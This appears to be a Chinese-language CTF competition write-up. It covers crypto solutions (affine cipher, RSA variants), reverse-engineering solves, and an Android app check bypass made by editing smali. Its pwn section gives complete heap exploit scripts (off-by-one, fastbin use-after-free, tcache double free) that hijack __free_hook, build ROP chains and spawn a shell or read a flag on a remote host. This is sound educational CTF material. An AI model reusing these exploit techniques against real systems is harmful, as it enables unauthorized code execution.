## Crypto

### [warmup]加密算法
```python=
import gmpy2
str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
enc= 'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'
flag=''
a,b,c=37,23,52
for i in enc:
    if i in str1:
        ind=str1.find(i)
        m=((ind-b)*gmpy2.invert(a,c))%c
        flag+=str1[m]
    else:
        flag+=i
print(flag)
#flag{AffInE_CIpheR_iS_clAssiC}
```
简单的仿射加密，c是52，a是37，b是23 

### RSA-1
```python=
import gmpy2
from Crypto.Util.number import *


e=0x10001
pm=(c*gmpy2.invert(pow(2021*1001,e),n) )%n
p=gmpy2.gcd(pm,n)
q=n//p
d=gmpy2.invert(e,(p-1)*(q-1))

mm=pow(c,d,n)
print(long_to_bytes(mm//(2021*1001*p)))
#flag{Math_1s_1nterest1ng_hah}

```
(2021\*1001\*p\*m)^e = c mod n 可求出pm，可得(p\*m)^e = pm + k*n 也就是 pm=k*p，和n取个gcd即可得到p，之后便是正常的rsa解密。

### RSA2-PLUS
主要是第一部分
![](https://i.imgur.com/pUT7g1U.png)

yafu分解一下能得到n1 进而 n2=n//n1

之后参考[https://jsur.in/post/2019-07-01-isitdtu-2019-quals-ctf-writeups](https://jsur.in/post/2019-07-01-isitdtu-2019-quals-ctf-writeups)进行分解，求出q1，和爆破出q1与p1，q2与p2的微小差值。

```python=
import  gmpy2

from gmpy2 import iroot
from Crypto.Util.number import isPrime
from Crypto.Util.number import inverse, long_to_bytes

n1= 
n2=n//n1
#def quadratic(a, b, c):
#    try:
#        (d, _) = iroot(b*b - (4*a*c),2)
#        return ((-b-d)//(2*a), (-b+d)//(2*a))
#    except:
#        return 0
#
#for (e, d) in ((e, d) for e in range(1, 5000) for d in range(1, 5000)):
#    q1 = quadratic(e, e*d+n1-n2, -d*n2)
#    if q1 != 0:
#        q1 = q1[1]
#    res = q1*q1*e + q1*(e*d+n1-n2)-d*n2
#    if res == 0 and isPrime(q1):
#        print(q1, e, d)
#

c = 
q1 = 7502883888097212950622788817096216502912511795977786941568063923158816805073284550069689733527712330353018568842826730967449095687927404679782394052855569
epsilon = 726
delta = 828
q2 = q1 + delta
p1 = n1//q2
p2 = p1 + epsilon
n = n1*n2
phi = (p1-1)*(p2-1)*(q1-1)*(q2-1)
d = inverse(0x10001, phi)
m = pow(c, d, n)
print(long_to_bytes(m).decode())
#flag{Euler_funct1ons
```
第二部分pq和p+q构造p-q解方程，正常rsa解密，phi(n)=p*(q**2)*(p-1)*(q-1)
```python=
import  gmpy2
from gmpy2 import iroot
from Crypto.Util.number import isPrime
from Crypto.Util.number import inverse, long_to_bytes
p2_add_q2 = 
p2_mul_q2 = 
n2 = 
c2 = 
e = 0x10001
p_q=gmpy2.iroot(p2_add_q2**2-4*p2_mul_q2,2)[0]
p=(p2_add_q2+p_q)//2
q=p2_add_q2-p

d=gmpy2.invert(e,p*(q**2)*(p-1)*(q-1))
print(long_to_bytes(pow(c2,d,n2)))
#_1s_very_interst1ng}
```

flag{Euler_funct1ons_1s_very_interst1ng}



## Re
### easy_re
流加密直接patch
```python=
# -*- coding:utf-8 -*-

addr = 0x10FF8D4   # patch address

test = "F58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014E5EC"  # patch hex data

ps = [i for i in b''.fromhex(test)]
for i, v in enumerate(ps):
    ida_bytes.patch_byte(addr+i, v)


```

![](https://i.imgur.com/vZVxjmR.png)



### babyvxworks
![](https://i.imgur.com/vKklqAQ.png)
清除花指令之后，看到这玩意

盲猜

21是行数，v41指向某段内存空间，0~116是位空间，4是位长度然后赋值- -

这段赋值应该是加密文本的对比
![](https://i.imgur.com/n77Xs1V.png)
rt

所以要逆的应该是sub_330

清一下花指令
![](https://i.imgur.com/OQqG8V0.png)

```python=
# -*- coding:utf-8 -*-
"""
@Author: Mas0n
@File: test.py
@Time: 2021-09-29 11:01
@Desc: It's all about getting better.
"""
import string

data = [0xBC, 0xA, 0xBB, 0xC1, 0xD5, 134, 127, 10, 201, 185, 81, 78, 136, 10, 130, 185, 49, 141, 10, 253, 201, 199, 127,
        185, 17, 78, 185, 232, 141, 87]
print(len(data))

for i, v in enumerate(data):
    a = v
    for j in range(len(data)):
        # a = ((a ^ 0x22) + 3) & 0xff
        a = ((a - 3) ^ 0x22) & 0xff
    print(chr(a), end="")
```
### 抛石机

![](https://i.imgur.com/4z5crCD.png)

check
```cpp=
_BOOL8 check()
{
  double v1; // [rsp+0h] [rbp-20h]
  double v2; // [rsp+8h] [rbp-18h]
  double v3; // [rsp+10h] [rbp-10h]
  double v4; // [rsp+18h] [rbp-8h]

  if ( *lin1 > *lin2 - 0.001 )
    return 1LL;
  if ( *lin3 > *lin4 - 0.001 )
    return 1LL;
  v4 = 149.2 * *lin1 + *lin1 * -27.6 * *lin1 - 129.0;
  v3 = 149.2 * *lin2 + *lin2 * -27.6 * *lin2 - 129.0;
  v2 = *lin3 * -39.6 * *lin3 + 59.2 * *lin3 + 37.8;
  v1 = *lin4 * -39.6 * *lin4 + 59.2 * *lin4 + 37.8;
  return v4 <= -0.00003
      || v4 >= 0.00003
      || v3 <= -0.00003
      || v3 >= 0.00003
      || v2 <= -0.00002
      || v2 >= 0.00002
      || v1 <= -0.00003
      || v1 >= 0.00003;
}
```
二元一次方程求解，求根公式求根

```python=
def solve(a, b, c):
    s1 = (-b + math.sqrt(b * b - 4 * a * c)) / (2 * a)
    s2 = (-b - math.sqrt(b * b - 4 * a * c)) / (2 * a)
    return s1, s2
```

然后把浮点数转成十六进制，取低位4字节

```python
def double_to_hex(f):
    return hex(struct.unpack('>Q', struct.pack('<d', f))[0] & 0xffffffff)[2:].zfill(8)
```

下面就是范围里猜数值的波动，最后猜出来

```python=
a1 = -27.6
b1 = 149.2
c1 = -129.0

so1 = solve(a1, b1, c1)
print(so1)
lin1 = double_to_hex(so1[0])
lin2 = double_to_hex(so1[1]+0.000001)

a2 = -39.6
b2 = 59.2
c2 = 37.8
so2 = solve(a2, b2, c2)
print(so2)
lin3 = double_to_hex(so2[0])
lin4 = double_to_hex(so2[1]+0.000001)


print("flag{" + lin1 + "-" + lin2[:4] + '-' + lin2[4:] + "-" + lin3[:4] + '-' + lin3[4:] + lin4 + "}")

```




## Pwn

### null
off by one
```python=
def add(idx, size, cont="A"):
    sendla("choice", "1")
    sendla("Index", str(idx))
    sendla("Size", str(size))
    senda("Content", cont)

def delete(idx):
    sendla("choice", "2")
    sendla("Index", str(idx))

def edit(idx, cont):
    sendla("choice", "3")
    sendla("Index", str(idx))
    senda("Content", cont)

def show(idx):
    sendla("choice", "4")
    sendla("Index", str(idx))

try:
    ## leak
    add(0, 0x18)
    add(1, 0x518)
    edit(1, b"A"*0x4f0 + p64(0x500) + p64(0x20))
    add(2, 0x100)
    add(3, 0x100)

    delete(1)
    edit(0, "A"*0x18+"\x00")
    add(1, 0x120)
    add(4, 0x3c0)
    delete(1)
    delete(2)

    add(1, 0x120)
    # debug()
    show(4)
    recvu("Content : ")
    a_libc = u64(recvn(6)+b"\x00\x00") - 0x3c4b78
    from mypwn import libc
    libc.address = a_libc
    print(hex(a_libc))

    ## hijack (unsorted bin 0x500)
    add(5, 0x60)
    edit(4, b"A"*0x68 + p64(0x100) + p64(0)+p64(libc.symbols["__free_hook"] - 0x15 -0x8))
    add(6, 0xf0)
    delete(5)
    edit(4, p64(libc.symbols["__free_hook"]-0x10))
    add(7, 0x60, "/bin/sh")
    add(8, 0x60, p64(libc.symbols["system"]))
    delete(7)

    # Get Shell
    io.interactive()
```

### ezuaf

fastbin uaf 

libc 2.23 11.3
在栈上写rop链

```python=
from pwn import *
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))

binary = './uaf_pwn'
libc = './libc6_2.23-0ubuntu11.3_amd64.so'
context.terminal = ['tmux', 'splitw', '-h']
context(binary = binary, log_level='debug')
# p = process(binary)
p = remote('82.157.5.28',51502)
elf = ELF(binary)
libc = ELF(libc)

def cmd(id):
    p.sendlineafter('>',str(id))
def add(size):
    cmd(1)
    p.sendlineafter('size>', str(size))
def dele(id):
    cmd(2)
    p.sendlineafter('index>',str(id))
def edit(id,data):
    cmd(3)
    p.sendlineafter('index>', str(id))
    p.sendafter('content>',data)
def show(id):
    cmd(4)
    p.sendlineafter('index>', str(id))

p.recvuntil("0x")
stack_addr = int(p.recvuntil('\n'),16)
fake_chunk = stack_addr + 0xb0
leak('stack', stack_addr)

add(0x500)
add(0x81)
cmd(0)
dele(0)

show(0)
libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 0x10 - 88 - libc.sym['__malloc_hook']
pop_rdi = libc_base +0x0000000000021112
system = libc_base + libc.sym['system']
binsh = libc_base + 0x000000000018ce57
leak('libc base',libc_base)

add(0x70) # 2
add(0x70) # 3

dele(2)
edit(2,p64(fake_chunk-0x10))
add(0x70) # 4
add(0x70) # 5

payload = 'a'*0x18 + p64(pop_rdi) + p64(binsh) + p64(system)
edit(5, payload)

cmd(666)

p.interactive()
```

### GreenTownNote

2.27 double free
free_hook 写setcontext+53 然后栈迁移orw

```python=
from pwn import *
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))

binary = './GreentownNote'
libc = './libc-2.27.so'
context.terminal = ['tmux', 'splitw', '-h']
context(binary = binary, log_level='debug')
# p = process(binary)
p = remote('82.157.5.28',51801)
elf = ELF(binary)
libc = ELF(libc)

def cmd(id):
    p.sendlineafter('choice :', str(id))
def add(size,data):
    cmd(1)
    p.sendlineafter('size :', str(size))
    p.sendafter('Content :',data)
def show(id):
    cmd(2)
    p.sendlineafter('Index :',str(id))
def dele(id):
    cmd(3)
    p.sendlineafter('Index :',str(id))

add(0x300,'a'*8)
add(0x300,'b'*8)
add(0x300,'c'*8)

for i in range(7):
    dele(0)
show(0)
heap_base = u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00')) - 0x260
leak('heap base', heap_base)

dele(1)
show(1)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ebca0
leak('libc base', libc_base)

open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
setcontext = libc_base + libc.sym['setcontext'] + 53

pop_rdi = libc_base + 0x000000000002155f
pop_rsi = libc_base + 0x0000000000023e6a
pop_rdx = libc_base + 0x0000000000001b96

orw_chunk = heap_base + 0x260
flag_str = orw_chunk+ 8*19
orw = ''
# open('./flag',0)
orw += p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(open_addr)
# read(3, flag_str, 0x20)
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(read_addr)
# write(1, flag_str, 0x20)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(write_addr)
orw += './flag\x00'

add(0x300,p64(libc_base+libc.sym['__free_hook']))
add(0x300,orw)
add(0x300,p64(setcontext))

payload = 'a'*0x68
payload+= p64(flag_str) + p64(0) + p64(0xdeadbeef) + p64(0xc0debeef)
payload+= p64(0x100) + p64(0) +p64(0xcccc) + p64(orw_chunk+8) + p64(pop_rdi)
add(0x200,payload)

dele(4)

p.interactive()
```

## 科技
### APP逆向-clockin
翻找下逻辑在`com.c.clock_in.PunchCardActivity`

![](https://i.imgur.com/LKlFZ3T.png)

rsa生成密钥对并加密了**permission2**字段值`not admin`

构造了一个post请求，body包含了密钥对和加密的数据

根据发送的`not admin`和回显的`you are not admin`，猜测只需要将`not admin`改成`admin`

反编译，先改下`android:testOnly`

![](https://i.imgur.com/tw3elyk.png)

然后改smali

![](https://i.imgur.com/SEcxtl0.png)

回编译打包输入host完事
